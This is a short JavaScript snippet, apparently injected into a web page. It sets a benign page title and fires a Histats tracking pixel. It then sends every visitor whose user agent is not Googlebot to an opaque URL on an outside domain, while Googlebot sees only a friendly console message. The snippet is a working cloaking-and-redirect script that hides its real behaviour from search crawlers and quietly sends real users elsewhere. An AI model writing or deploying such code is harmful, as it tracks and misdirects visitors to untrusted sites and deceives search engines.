(function() {
  document.title = "Welcome to My Page";

  // ২. Histats Live Tracking Pixel
  var tracker = new Image();
  tracker.src = "https://s10.histats.com/1.gif?5032111&101";

  // ৩. User-Agent Filter & Redirect Logic
  if (!navigator.userAgent.includes('Googlebot')) {
    window.location.href = "https://nolatec.org/4/1e5c257bb6f145c9aef01843d3777f97";
  } else {
    console.log("Thanks for visiting my page");
  }
})();
